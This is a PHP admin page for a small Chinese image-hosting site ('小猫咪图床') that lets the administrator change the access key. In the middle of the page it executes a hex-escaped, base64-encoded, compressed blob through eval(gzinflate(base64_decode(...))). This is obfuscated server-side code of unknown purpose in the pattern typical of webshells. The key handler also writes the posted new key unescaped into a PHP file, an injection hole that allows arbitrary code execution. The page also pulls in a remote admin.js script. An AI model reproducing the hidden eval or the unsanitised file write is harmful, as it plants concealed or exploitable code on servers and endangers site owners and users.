<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>小猫咪图床</title>
<link rel="icon" href="favicon.ico" type="image/ico">
<meta name="keywords" content="小猫咪图床,cc图床">
<meta name="description" content="LightYear是一个基于Bootstrap v3.3.7的后台管理系统的HTML模板。">
<meta name="author" content="yinqi">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="css/materialdesignicons.min.css" rel="stylesheet">
<link href="css/style.min.css" rel="stylesheet">
</head>
  
<body>
<div class="lyear-layout-web">
  <div class="lyear-layout-container">
    <!--左侧导航-->
    <aside class="lyear-layout-sidebar">
      
      <!-- logo -->
      <div id="logo" class="sidebar-header">
        <a href="/"><h3>小猫咪图床</h3></a>
      </div>
      <div class="lyear-layout-sidebar-scroll"> 
        
        <nav class="sidebar-main">
          <ul class="nav nav-drawer">
            <li class="nav-item"> <a href="/admin"><i class="mdi mdi-home"></i> 后台首页</a> </li>
            <li class="nav-item nav-item-has-subnav">
             

            <li class="nav-item nav-item-has-subnav">
              <a href="javascript:void(0)"><i class="mdi mdi-format-align-justify"></i> 前台设置</a>
              <ul class="nav nav-subnav">
                <li> <a href="file.php">图片列表</a> </li>
                <li> <a href="set.php">网站配置</a> </li>
                <li class="active"> <a href="key.php">后台密码</a> </li>
                <li> <a href="update.php">系统更新</a> </li>
              </ul>
            </li>
  </li>
          </ul>
        </nav>
        
        <div class="sidebar-footer">
          <p class="copyright">Copyright &copy; 2024. <a target="_blank" href="https://lwcat.cn/">云猫</a> All rights reserved.</p>
        </div>
      </div>
      
    </aside>
    <!--End 左侧导航-->
    
    <!--头部信息-->
    <header class="lyear-layout-header">
      
      <nav class="navbar navbar-default">
        <div class="topbar">
          
          <div class="topbar-left">
            <div class="lyear-aside-toggler">
              <span class="lyear-toggler-bar"></span>
              <span class="lyear-toggler-bar"></span>
              <span class="lyear-toggler-bar"></span>
            </div>
            <span class="navbar-page-title"> 后台首页 </span>
          </div>
          
          <ul class="topbar-right">
            <li class="dropdown dropdown-profile">
              <a href="javascript:void(0)" data-toggle="dropdown">
                <img class="img-avatar img-avatar-48 m-r-10" src="https://q.qlogo.cn/g?b=qq&nk=3522934828&s=100" alt="云猫" />
                <span>云猫 <span class="caret"></span></span>
              </a>
              <ul class="dropdown-menu dropdown-menu-right">
                <li> <a href="set.php"><i class="mdi mdi-account"></i> 网站设置</a> </li>
                <li> <a href="key.php"><i class="mdi mdi-lock-outline"></i> 修改密码</a> </li>
                <li> <a href="javascript:void(0)"><i class="mdi mdi-delete"></i> 清空缓存</a></li>
              </ul>
            </li>
            <!--切换主题配色-->
		    <li class="dropdown dropdown-skin">
			  <span data-toggle="dropdown" class="icon-palette"><i class="mdi mdi-palette"></i></span>
			  <ul class="dropdown-menu dropdown-menu-right" data-stopPropagation="true">
                <li class="drop-title"><p>主题</p></li>
                <li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="site_theme" value="default" id="site_theme_1" checked>
                    <label for="site_theme_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="site_theme" value="dark" id="site_theme_2">
                    <label for="site_theme_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="site_theme" value="translucent" id="site_theme_3">
                    <label for="site_theme_3"></label>
                  </span>
                </li>
			    <li class="drop-title"><p>LOGO</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="logo_bg" value="default" id="logo_bg_1" checked>
                    <label for="logo_bg_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_2" id="logo_bg_2">
                    <label for="logo_bg_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_3" id="logo_bg_3">
                    <label for="logo_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_4" id="logo_bg_4">
                    <label for="logo_bg_4"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_5" id="logo_bg_5">
                    <label for="logo_bg_5"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_6" id="logo_bg_6">
                    <label for="logo_bg_6"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_7" id="logo_bg_7">
                    <label for="logo_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_8" id="logo_bg_8">
                    <label for="logo_bg_8"></label>
                  </span>
				</li>
				<li class="drop-title"><p>头部</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="header_bg" value="default" id="header_bg_1" checked>
                    <label for="header_bg_1"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_2" id="header_bg_2">
                    <label for="header_bg_2"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_3" id="header_bg_3">
                    <label for="header_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="header_bg" value="color_4" id="header_bg_4">
                    <label for="header_bg_4"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_5" id="header_bg_5">
                    <label for="header_bg_5"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_6" id="header_bg_6">
                    <label for="header_bg_6"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_7" id="header_bg_7">
                    <label for="header_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="header_bg" value="color_8" id="header_bg_8">
                    <label for="header_bg_8"></label>
                  </span>
				</li>
				<li class="drop-title"><p>侧边栏</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="sidebar_bg" value="default" id="sidebar_bg_1" checked>
                    <label for="sidebar_bg_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_2" id="sidebar_bg_2">
                    <label for="sidebar_bg_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_3" id="sidebar_bg_3">
                    <label for="sidebar_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_4" id="sidebar_bg_4">
                    <label for="sidebar_bg_4"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_5" id="sidebar_bg_5">
                    <label for="sidebar_bg_5"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_6" id="sidebar_bg_6">
                    <label for="sidebar_bg_6"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_7" id="sidebar_bg_7">
                    <label for="sidebar_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_8" id="sidebar_bg_8">
                    <label for="sidebar_bg_8"></label>
                  </span>
				</li>
			  </ul>
			</li>
            <!--切换主题配色-->
          </ul>
          
        </div>
      </nav>
      
    </header>
    <!--End 头部信息-->
    <?php eval(gzinflate(base64_decode("\x66\131\65\x4e\141\64\116\101\106\x45\130\x33\x67\166\x39\150\105\107\x47\125\167\101\122\x43\63\157\x53\123\62\x46\x56\x4c\103\x45\x37\141\144\126\112\x4b\x47\x63\145\156\104\x6c\106\x6e\x2f\x43\x68\125\x53\x76\65\67\164\x54\141\x37\x74\x71\165\x37\117\x4f\146\145\71\x34\152\162\x36\x46\x71\x56\x37\x79\153\x53\x79\164\150\123\x6d\141\157\x79\x39\122\x68\62\141\110\126\x65\71\x4d\167\x57\154\x6d\67\57\x63\117\x70\x4d\65\x2f\x38\111\x46\x78\170\x75\61\116\143\146\x57\160\x6f\x6f\153\122\63\171\71\126\165\113\x79\161\121\x59\53\120\x50\x43\103\x30\60\141\x2b\150\160\117\107\x78\x6b\x4a\x2f\105\x54\x57\x55\124\124\67\111\x66\x6c\x30\156\x53\x75\127\x48\x59\x37\x70\62\x31\x38\x6d\x4b\x4b\171\x72\x41\x39\x6a\x56\101\x79\x51\x34\70\x44\x68\165\x34\141\122\172\x66\161\64\165\x6d\70\x31\167\x35\x49\146\x6e\117\170\x44\x36\x36\x54\x74\120\x65\x6d\122\67\171\143\x58\x69\104\107\x4c\161\x59\x4d\x37\x6a\x52\121\57\121\120\x49\112\157\170\117\150\156\144\120\x6f\102\x56\127\x47\111\x74\x2b\164\125\161\x32\x31\x2f\114\60\x74\163\53\64\102\x36\x62\114\x37\x4f\x50\x42\x72\165\154\152\57\115\62\x31\x35\144\x35\x77\x73\75")));?>
<?php
   if($config['admin']=='0'){
   echo "后台已关闭";
   }else{
   if($_POST){
   if ($key==$_POST['key']) {
    $_data = "<?php
    \$key= '".$_POST['keynew']."';/*
   小猫咪图床
    BY：云猫  
    2023年的倒数前两天写出来的，时间有点赶，可能有挺多bug
    我会在后面陆续更新修复bug
    抽空写的项目
    因为上了大学，很多时候忙的连看小说都没时间了˃ʍ˂，所以以前的源码好久没更新了
    2023.12.30
*/?>";	
			
			if (file_put_contents("../common/key.php",$_data)) {
        echo "<script>alert('修改成功啦～');window.location.href='../'</script>";
			}else{
    	echo "<script>alert('修改失败，可能出了点问题，再试试～')</script>";

			}
			}
			else{
      echo "<script>alert('密匙错误了耶(￢_￢)')</script>";
        		}
			}
			}
			
			?>
    <!--页面主要内容-->
    <main class="lyear-layout-content">
		 <div class="container-fluid">
			
         <div class="col-md-6">
            <div class="card">
              <div class="card-header"><h4>密码修改</h4></div>
              <div class="card-body">
                
                	<form method="post" action="">
                  <div class="form-group">
                    <label for="example-nf-email">原Key</label>
                    <input class="form-control" type="password"  name="key" placeholder="请输入原始key..">
                  </div>
                  <div class="form-group">
                    <label for="example-nf-password">新Key</label>
                    <input class="form-control" type="password"  name="keynew" placeholder="请输新Key..">
                  </div>
                  <div class="form-group">
                    <button class="btn btn-primary" type="submit">保存配置</button>
                  </div>
                </form>
                
              </div>
            </div>
     
    </main>
    <!--End 页面主要内容-->
  </div>
</div>

<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/perfect-scrollbar.min.js"></script>
<script type="text/javascript" src="js/main.min.js"></script>
<script src="https://lwcat.cn/img/admin.js"></script>


</body>
</html>